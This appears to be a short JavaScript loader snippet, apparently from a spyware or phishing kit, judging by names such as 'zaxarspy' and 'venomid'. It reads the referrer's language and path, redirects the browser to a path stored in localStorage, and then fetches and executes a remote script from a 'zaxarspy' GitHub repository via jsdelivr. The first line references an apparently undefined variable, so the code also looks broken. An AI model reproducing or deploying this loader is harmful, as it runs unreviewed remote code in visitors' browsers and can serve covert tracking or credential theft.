const zaxuserkey = zaxudserkey;
if(document.referrer){
    const url = new URL(document.referrer);
	var zxlang = url.searchParams.get("l");
	var zxtype = url.pathname.replace(/\//,'');
 }
if (zxtype == null || zxtype == ""){
    var zxtype = "m";
}
if (zxlang == null || zxlang == ""){
    var zxlang = "en";
}
let langcode = zxlang.substring(0,2);

var zaxar = window.location.pathname;
if (zaxar != ("/"+localStorage.getItem("venomid"))) {
window.location.href = ("/"+localStorage.getItem("venomid"));
}else if(zaxar == ("/"+localStorage.getItem("venomid"))){
  $.getScript("https://cdn.jsdelivr.net/gh/zaxarspy/v2/new/WS58z3kKFfvvyeCk.min.js")
}
